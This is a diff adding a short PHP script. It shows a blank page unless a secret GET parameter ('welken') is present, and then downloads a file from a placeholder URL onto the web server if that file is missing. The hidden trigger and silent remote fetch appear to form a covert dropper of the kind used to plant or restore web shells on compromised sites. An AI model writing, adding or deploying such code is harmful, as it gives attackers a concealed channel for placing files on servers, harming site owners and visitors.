@@ -1,0 +1,34 @@
+<?php
+function downloadFile($url, $saveTo) {
+    $ch = curl_init($url);
+    $fp = fopen($saveTo, 'wb');
+    
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    
+    curl_exec($ch);
+    if (curl_errno($ch)) {
+        echo 'Error: ' . curl_error($ch);
+    } else {
+        echo 'File downloaded successfully';
+    }
+    
+    curl_close($ch);
+    fclose($fp);
+}
+
+// Check if the query parameter 'welken' is present
+if (!isset($_GET['welken'])) {
+    // Display a blank page if the parameter is not present
+    exit;
+}
+
+$filePath = 'path/to/your/file.ext'; // Replace with the path to the file you want to check
+$fileUrl = 'https://example.com/path/to/file.ext'; // Replace with the URL of the file you want to download
+
+if (!file_exists($filePath)) {
+    downloadFile($fileUrl, $filePath);
+} else {
+    echo 'File already exists in the directory';
+}
+?>
